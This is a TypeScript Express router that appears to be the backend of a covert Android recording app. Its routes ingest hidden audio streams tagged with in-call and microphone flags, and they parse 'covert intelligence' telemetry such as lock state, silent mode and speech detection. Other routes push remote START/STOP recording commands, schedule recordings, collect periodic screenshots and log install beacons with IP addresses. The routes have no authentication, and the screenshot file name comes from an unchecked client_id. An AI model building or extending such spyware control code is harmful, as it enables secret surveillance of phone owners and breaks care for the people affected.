/**
 * broadcast.ts — API routes for broadcaster clients.
 *
 * Handles session lifecycle and chunk ingestion:
 *   POST /api/v1/broadcasts              — Create new session
 *   POST /api/v1/broadcasts/:id/chunk    — Upload an audio chunk
 *   PUT  /api/v1/broadcasts/:id/end      — End a session
 *   GET  /api/v1/broadcasts/:id          — Get session info
 */

import { Router, Request, Response } from 'express';
import multer from 'multer';
import rateLimit from 'express-rate-limit';
import { v4 as uuidv4 } from 'uuid';
import fs from 'fs';
import path from 'path';
import archiver from 'archiver';
import * as db from '../database';
import * as storage from '../storage';
import { appendToHLS, finalizeHLS } from '../hls';
import { sendDeviceCommand, broadcastLiveEvent } from '../websocket';
import { MAX_UPLOAD_SIZE, CHUNK_DURATION_MS, PUBLIC_DIR } from '../config';

const router = Router();
const exportRateLimit = rateLimit({
    windowMs: 60 * 1000,
    max: 15,
    standardHeaders: true,
    legacyHeaders: false,
    message: {
        status: 'error',
        message: 'Too many export requests. Please retry after a minute.',
    },
});

// Multer: store uploaded chunks in memory (they're small — max 5MB)
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: MAX_UPLOAD_SIZE },
});

// ════════════════════════════════════════════════════════════════════════════
// CREATE SESSION
// ════════════════════════════════════════════════════════════════════════════

router.post('/', (req: Request, res: Response) => {
    try {
        const sessionId = req.body?.session_id || uuidv4();
        const { client_name, device_info, title, stream_type } = req.body || {};
        const streamType = stream_type === 'main' ? 'main' : 'hidden';

        // Create storage directories
        storage.createSessionDirs(sessionId);

        // Create database record
        const session = db.createSession(
            sessionId,
            client_name || '',
            device_info || '',
            title || '',
            streamType
        );

        console.log(`[broadcast] New session: ${sessionId} (client: ${client_name || 'unknown'}, type: ${streamType})`);

        res.status(201).json({
            status: 'created',
            session_id: sessionId,
            session,
        });
    } catch (err: any) {
        console.error('[broadcast] Create session error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// UPLOAD CHUNK
// ════════════════════════════════════════════════════════════════════════════

router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const file = req.file;

        if (!file) {
            res.status(400).json({ status: 'error', message: 'No audio file provided' });
            return;
        }

        // Verify session exists or auto-recover if missing (e.g. after server restart)
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name) 
                || (db.getAllDeviceCommands()[0]?.client_id) 
                || 'Realme-RMX2040';
            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
            session = db.createSession(
                session_id,
                clientName,
                'Android Device (Live)',
                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
                streamType
            );
            console.log(`[broadcast] Auto-recovered live session for chunk: ${session_id} (${clientName}, type: ${streamType})`);
        } else if (session.status !== 'live') {
            db.reactivateSession(session_id);
            console.log(`[broadcast] Reactivated ended session to live on chunk ingest: ${session_id}`);
        }

        // Get sequence number from body or auto-increment
        let sequenceNum: number;
        if (req.body.sequence_num !== undefined) {
            sequenceNum = parseInt(req.body.sequence_num, 10);
        } else {
            sequenceNum = db.getLatestChunkSequence(session_id) + 1;
        }

        // Duplicate detection: if this sequence already uploaded, skip
        if (db.chunkExists(session_id, sequenceNum)) {
            console.log(`[broadcast] Duplicate chunk skipped: session=${session_id} seq=${sequenceNum}`);
            res.json({
                status: 'already_exists',
                session_id,
                sequence_num: sequenceNum,
                message: 'Chunk already uploaded.',
            });
            return;
        }

        // Parse optional metadata from request body
        const chunkId = req.body.chunk_id || uuidv4();
        const durationMs = parseInt(req.body.duration_ms || String(CHUNK_DURATION_MS), 10);
        const checksum = req.body.checksum || '';
        const inCall = req.body.in_call === '1' || req.body.in_call === 'true' ? 1 : 0;
        const micInUse = req.body.mic_in_use === '1' || req.body.mic_in_use === 'true' ? 1 : 0;
        const clientTimestamp = req.body.timestamp;

        // Save chunk to disk
        const saved = storage.saveChunk(session_id, sequenceNum, file.buffer, file.originalname);

        // Insert into database
        const chunk = db.insertChunk(
            chunkId,
            session_id,
            sequenceNum,
            saved.filename,
            saved.filepath,
            saved.fileSize,
            durationMs,
            checksum,
            inCall,
            micInUse
        );

        // Dynamically update device_info for Dashboard Session Lists (Covert Telemetry)
        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?/);
        if (metaMatch) {
            const battery = metaMatch[1];
            const routeCode = metaMatch[3];
            const screenCode = metaMatch[4];
            const unlockCode = metaMatch[5];
            const powerCode = metaMatch[6];
            const ringerCode = metaMatch[7];
            const speechCode = metaMatch[8];
            const dbVal = metaMatch[9];

            const session = db.getSession(session_id);
            if (session) {
                const baseInfo = session.device_info.split('|')[0].trim();

                // Only show covert intelligence details if this is the covert "hidden" stream!
                // Main stream sessions remain clean and basic.
                if (session.stream_type === 'hidden') {
                    let routeStr = '';
                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';

                    let powerStr = '';
                    if (powerCode === 'CUSB') powerStr = ' (💻 PC USB)';
                    else if (powerCode === 'CAC') powerStr = ' (⚡ Wall AC)';
                    else if (powerCode === 'CWIR') powerStr = ' (🛜 Wireless)';

                    let screenStr = '';
                    if (screenCode === '1') {
                        screenStr = unlockCode === '1' ? ' | 📱 Screen ON (Unlocked)' : ' | 📱 Screen ON (Locked)';
                    } else if (screenCode === '0') {
                        screenStr = ' | 🌑 Screen OFF';
                    }

                    let ringerStr = '';
                    if (ringerCode === 'RS') ringerStr = ' | 🔇 Silent';
                    else if (ringerCode === 'RV') ringerStr = ' | 📳 Vibrate';

                    let audioStr = '';
                    if (speechCode === '1') {
                        audioStr = ` | 🗣️ Speech (${dbVal || 0}dB)`;
                    }

                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}`;
                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                } else {
                    // Standard / Main stream — keep simple
                    let routeStr = '';
                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';
                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${routeStr}`;
                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                }
            }
        }

        console.log(`[broadcast] Chunk saved: session=${session_id} seq=${sequenceNum} call=${inCall} micUse=${micInUse}`);

        // Generate HLS segment (async — don't block response)
        appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp, durationMs).catch(err => {
            console.error(`[broadcast] HLS generation failed for seq ${sequenceNum}:`, err);
        });

        res.json({
            status: 'confirmed',
            session_id,
            chunk_id: chunkId,
            sequence_num: sequenceNum,
            file_size: saved.fileSize,
            message: 'Chunk uploaded successfully. You may delete the local copy.',
        });
    } catch (err: any) {
        console.error('[broadcast] Upload chunk error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// EXPORT AUDIO BY CHANNEL (Mic vs Internal vs Stereo)
// ════════════════════════════════════════════════════════════════════════════

router.get('/:session_id/export-channel', exportRateLimit, (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const channelParam = (req.query.channel as string || 'both').toLowerCase();
        const session = db.getSession(session_id);

        if (!session) {
            res.status(404).json({ status: 'error', message: 'Session not found' });
            return;
        }

        const rawDir = storage.getRawDir(session_id);
        const vodM3u8 = `${storage.getHlsDir(session_id)}/vod.m3u8`;

        if (!require('fs').existsSync(vodM3u8) && !require('fs').existsSync(rawDir)) {
            res.status(404).json({ status: 'error', message: 'No recordings available for this session' });
            return;
        }

        const formatParam = (req.query.format as string || 'aac').toLowerCase();

        if (formatParam === 'zip') {
            const chunks = db.getSessionChunks(session_id);
            if (chunks.length === 0) {
                res.status(404).json({ status: 'error', message: 'No chunks available for this session' });
                return;
            }

            const rawDir = storage.getRawDir(session_id);
            const resolvedRawDir = path.resolve(rawDir);
            const chunkFiles = chunks
                .map(c => path.resolve(c.filepath))
                .filter(filePath =>
                    (filePath === resolvedRawDir || filePath.startsWith(`${resolvedRawDir}${path.sep}`))
                    && fs.existsSync(filePath)
                );

            if (chunkFiles.length === 0) {
                res.status(404).json({ status: 'error', message: 'Chunk files not found on disk' });
                return;
            }

            const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_chunks.zip`;
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

            const archive = archiver('zip', {
                zlib: { level: 6 },
            });

            archive.on('error', (err: any) => {
                console.error('[broadcast] ZIP export error:', err);
                if (!res.headersSent) {
                    res.status(500).json({ status: 'error', message: 'ZIP export failed' });
                }
            });

            archive.pipe(res);

            for (const filePath of chunkFiles) {
                archive.file(filePath, { name: path.basename(filePath) });
            }

            archive.finalize();
            return;
        }
        
        if (formatParam === 'm3u8') {
            const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.m3u8`;
            res.setHeader('Content-Type', 'audio/x-mpegurl');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.sendFile(vodM3u8);
            return;
        }

        // Export as single combined audio file using FFmpeg
        const isMP3 = formatParam === 'mp3';
        const ext = isMP3 ? 'mp3' : 'aac';
        const contentType = isMP3 ? 'audio/mpeg' : 'audio/aac';
        const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.${ext}`;
        
        res.setHeader('Content-Type', contentType);
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

        const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg');
        const { spawn } = require('child_process');

        const args = ['-i', vodM3u8];
        if (isMP3) {
            args.push('-c:a', 'libmp3lame', '-q:a', '2', '-f', 'mp3');
        } else {
            args.push('-c:a', 'copy', '-f', 'adts'); // fast copy
        }
        args.push('pipe:1');

        const proc = spawn(ffmpegInstaller.path, args);
        proc.stdout.pipe(res);

        proc.on('error', (err: any) => {
            console.error('[broadcast] FFmpeg export error:', err);
            if (!res.headersSent) {
                res.status(500).json({ status: 'error', message: 'Export failed' });
            }
        });

        req.on('close', () => {
            if (!proc.killed) {
                proc.kill();
            }
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// END SESSION
// ════════════════════════════════════════════════════════════════════════════

router.put('/:session_id/end', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;

        const session = db.getSession(session_id);
        if (!session) {
            res.status(404).json({ status: 'error', message: 'Session not found' });
            return;
        }

        db.endSession(session_id);
        finalizeHLS(session_id);

        console.log(`[broadcast] Session ended: ${session_id}`);

        res.json({
            status: 'ended',
            session_id,
            message: 'Session ended. VOD playlist finalized.',
        });
    } catch (err: any) {
        console.error('[broadcast] End session error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.put('/:session_id/activate', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name) || 'Realme-RMX2040';
            session = db.createSession(session_id, clientName, 'Android Device (Live)', `Live Stream - ${clientName}`);
        } else {
            db.reactivateSession(session_id);
        }
        console.log(`[broadcast] Session activated/resumed as live: ${session_id}`);
        res.json({ status: 'live', session_id, message: 'Session is now live.' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});



// ════════════════════════════════════════════════════════════════════════════
// REMOTE CONTROL COMMANDS
// ════════════════════════════════════════════════════════════════════════════

router.post('/remote-command', (req: Request, res: Response) => {
    try {
        const { client_id, command } = req.body;
        if (!client_id || !command) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
            return;
        }

        db.setDeviceCommand(client_id, command);
        console.log(`[broadcast] Remote command set for ${client_id}: ${command}`);

        // ⚡ Send instant push command through live WebSocket (0ms latency, WhatsApp style)
        const pushedViaSocket = sendDeviceCommand(client_id, command);
        
        res.json({
            status: 'success',
            client_id,
            command,
            delivered_via_socket: pushedViaSocket,
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.get('/command', (req: Request, res: Response) => {
    try {
        const client_id = req.query.client_id as string;
        const status = req.query.status as string; // 'idle' or 'recording'
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        if (status) {
            db.updateDeviceStatus(client_id, status);
        }

        const cmd = db.getDeviceCommand(client_id);
        const commandStr = cmd ? cmd.command : 'NONE';
        const autoScreenshot = cmd ? cmd.auto_screenshot : 0;
        const screenshotInterval = cmd ? cmd.screenshot_interval : 30;
        const startTime = cmd ? (cmd.start_time || "") : "";
        const stopTime = cmd ? (cmd.stop_time || "") : "";
        
        // Don't clear START/STOP commands here — wait for the APK to acknowledge via /command/ack
        // Only clear transient one-shot commands that don't need reliability
        if (commandStr === 'SCREENSHOT_NOW') {
             db.clearDeviceCommand(client_id);
             console.log(`[broadcast] Transient command consumed by ${client_id}: ${commandStr}`);
        } else if (commandStr === 'START' || commandStr === 'STOP') {
             console.log(`[broadcast] Command delivered to ${client_id}: ${commandStr} (awaiting ACK)`);
        }

        res.json({ 
            command: commandStr,
            auto_screenshot: autoScreenshot,
            screenshot_interval: screenshotInterval,
            start_time: startTime,
            stop_time: stopTime
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// APK acknowledges it successfully processed a command
router.post('/command/ack', (req: Request, res: Response) => {
    try {
        const { client_id, command } = req.body;
        if (!client_id || !command) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
            return;
        }
        
        // Only clear the command if it matches what the APK is acknowledging
        const current = db.getDeviceCommand(client_id);
        if (current && current.command === command) {
            db.clearDeviceCommand(client_id);
            console.log(`[broadcast] Command ACK received from ${client_id}: ${command}`);
        }
        
        res.json({ status: 'acknowledged', client_id, command });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.post('/screenshot-settings', (req: Request, res: Response) => {
    try {
        const { client_id, auto_screenshot, interval } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        db.updateDeviceScreenshotSettings(client_id, auto_screenshot ? 1 : 0, interval || 30);
        res.json({ status: 'success' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.post('/schedule', (req: Request, res: Response) => {
    try {
        const { client_id, start_time, stop_time } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        db.updateDeviceSchedule(client_id, start_time || "", stop_time || "");
        console.log(`[broadcast] Schedule set for ${client_id}: start=${start_time}, stop=${stop_time}`);
        res.json({ status: 'success', client_id, start_time, stop_time });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.post('/upload-screenshot', upload.single('image'), (req: Request, res: Response) => {
    try {
        const { client_id } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        if (!req.file) {
            res.status(400).json({ status: 'error', message: 'Missing image file' });
            return;
        }
        
        const dir = path.join(PUBLIC_DIR, 'screenshots');
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        
        fs.writeFileSync(path.join(dir, `${client_id}.jpg`), req.file.buffer);
        
        res.json({ status: 'success' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// APP INSTALL BEACON (Tracks when client APK is first installed / activated)
// ════════════════════════════════════════════════════════════════════════════

router.post('/install-beacon', (req: Request, res: Response) => {
    try {
        const { client_id, device_model, manufacturer, os_version, app_version } = req.body || {};
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        const forwarded = req.headers['x-forwarded-for'];
        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';

        const record = db.recordDeviceInstall(
            client_id,
            device_model || 'Unknown',
            manufacturer || 'Android',
            os_version || '',
            app_version || '',
            ip
        );

        console.log(`[broadcast] 📱 New App Install beacon recorded: ${record.manufacturer} ${record.device_model} (Client ID: ${record.client_id}) from IP ${ip}`);

        broadcastLiveEvent({
            type: 'new_install',
            data: record,
        });

        res.json({ status: 'ok', message: 'Install beacon recorded successfully', install: record });
    } catch (err: any) {
        console.error('[broadcast] Error recording install beacon:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// GET SESSION INFO (Must remain after /command to prevent route shadowing)
// ════════════════════════════════════════════════════════════════════════════

router.get('/:session_id', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const session = db.getSession(session_id);
        if (!session) {
            res.status(404).json({ status: 'not_found' });
            return;
        }

        const chunks = db.getSessionChunks(session_id);

        res.json({
            session,
            chunks_count: chunks.length,
            latest_sequence: chunks.length > 0 ? chunks[chunks.length - 1].sequence_num : -1,
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

export default router;

